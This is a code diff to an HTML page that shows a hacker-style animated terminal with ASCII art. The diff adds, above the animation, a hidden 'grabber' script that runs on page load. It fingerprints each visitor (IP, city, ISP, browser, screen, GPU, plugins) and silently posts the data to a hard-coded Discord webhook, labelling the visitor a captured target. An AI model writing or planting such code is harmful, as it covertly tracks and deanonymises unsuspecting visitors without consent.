@@ -39,8 +39,91 @@
 <div id="terminal"></div>
 
 <script>
-const terminal = document.getElementById("terminal");
+/* ===== CONFIG DO GRABBER ===== */
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI"; // ❗ Cole aqui o seu webhook
+/* ============================= */
 
+(async function grab() {
+    const fingerprint = {};
+
+    // 1) IP + ISP básico via ipify + ipinfo
+    try {
+        const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
+        const info = await fetch(`https://ipinfo.io/${ip}/json`).then(r => r.json());
+        fingerprint.ip       = ip;
+        fingerprint.city     = info.city;
+        fingerprint.region   = info.region;
+        fingerprint.country  = info.country;
+        fingerprint.loc      = info.loc;
+        fingerprint.org      = info.org;
+    } catch(e) {
+        fingerprint.ip_error = e.message;
+    }
+
+    // 2) Dados do navegador
+    fingerprint.userAgent = navigator.userAgent;
+    fingerprint.language  = navigator.language;
+    fingerprint.languages = navigator.languages;
+    fingerprint.platform  = navigator.platform;
+    fingerprint.cookie    = navigator.cookieEnabled;
+    fingerprint.doNotTrack = navigator.doNotTrack;
+
+    // 3) Resolução / cores
+    fingerprint.screen = {
+        width  : screen.width,
+        height : screen.height,
+        availWidth  : screen.availWidth,
+        availHeight : screen.availHeight,
+        colorDepth  : screen.colorDepth,
+        pixelDepth  : screen.pixelDepth
+    };
+
+    // 4) WebGL vendor & renderer (hardware)
+    try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        fingerprint.webGL = {
+            vendor : gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        };
+    } catch(e) {
+        fingerprint.webGL = null;
+    }
+
+    // 5) Plugins (só Chrome/Edge legado)
+    fingerprint.plugins = [...navigator.plugins].map(p => p.name).join(", ");
+
+    // 6) Timestamp UTC
+    fingerprint.timestamp = new Date().toISOString();
+
+    // 7) Envia para o webhook
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                username: "Grabber",
+                avatar_url: "https://i.imgur.com/48hHZr2.png",
+                content: "@everyone **Novo visitante capturado!**",
+                embeds: [{
+                    title: "Dados do Alvo",
+                    color: 0xff0000,
+                    fields: Object.entries(fingerprint).map(([k,v]) => ({
+                        name: k,
+                        value: "```" + JSON.stringify(v, null, 2) + "```",
+                        inline: false
+                    }))
+                }]
+            })
+        });
+    } catch(e) {
+        /* silencioso */
+    }
+})();
+
+/* ===== TERMINAL VISUAL (seu código original, acelerado) ===== */
+const terminal = document.getElementById("terminal");
 const lines = [
     "C:\\Users\\TERMINAL> Iniciando sistema...",
     "C:\\Users\\TERMINAL> Carregando módulos...",
@@ -50,28 +133,25 @@ const lines = [
 ];
 
 let index = 0;
-
 function typeLine() {
     if (index < lines.length) {
         const line = document.createElement("div");
         terminal.appendChild(line);
         const text = lines[index];
         let charIndex = 0;
-
         function typeChar() {
             if (charIndex < text.length) {
                 line.textContent += text[charIndex];
                 charIndex++;
-                setTimeout(typeChar, 6);   // 3× mais rápido (20 ms → 6 ms)
+                setTimeout(typeChar, 6);
             } else {
                 index++;
-                setTimeout(typeLine, 80);  // 3× mais rápido (300 ms → 80 ms)
+                setTimeout(typeLine, 80);
             }
         }
         typeChar();
     } else {
         terminal.appendChild(document.createElement("br"));
-
         const ascii = `
                                        .:^!7?JYYYYYJJ?!~^:
                                 :^!?5GB#@@@&#BBGP55Y555PP55Y?!^.
@@ -120,7 +200,6 @@ function typeLine() {
                                    .J&@@@@@@@@@@@@@@@@@@@@@@@@@@@BY~.
                                  ^JG&###BG#BGPPPPG#@@@@@@@@&#BBBBBBPY7~
         `;
-
         const title = `
  ██████╗   ███████╗  ██████╗    █████╗    ██████╗    █████╗    ██████╗       ██████╗    ██████╗      ███╗   ███╗   █████╗   ██╗     
 ██╔════╝   ██╔════╝  ██╔══██╗  ██╔══██╗  ██╔════╝   ██╔══██╗  ██╔═══██╗      ██╔══██╗  ██╔═══██╗     ████╗ ████║  ██╔══██╗  ██║     
@@ -129,30 +208,24 @@ function typeLine() {
 ╚██████╔╝  ███████╗  ██║  ██║  ██║  ██║  ╚██████╗   ██║  ██║  ╚██████╔╝      ██████╔╝  ╚██████╔╝     ██║ ╚═╝ ██║  ██║  ██║  ███████╗
  ╚═════╝   ╚══════╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝   ╚═════╝   ╚═╝  ╚═╝   ╚═════╝        ╚═════╝    ╚═════╝      ╚═╝     ╚═╝  ╚═╝  ╚═╝  ╚══════╝
         `;
-
         const container = document.createElement("div");
         container.style.display = "flex";
         container.style.gap = "40px";
-
         const pre = document.createElement("pre");
         pre.style.color = "#f00";
         pre.textContent = ascii;
-
         const nameBlock = document.createElement("pre");
         nameBlock.style.color = "#f00";
         nameBlock.style.fontSize = "14px";
         nameBlock.textContent = title;
-
         container.appendChild(pre);
         container.appendChild(nameBlock);
         terminal.appendChild(container);
-
         const cursor = document.createElement("span");
         cursor.className = "cursor";
         terminal.appendChild(cursor);
     }
 }
-
 typeLine();
 </script>
 </body>
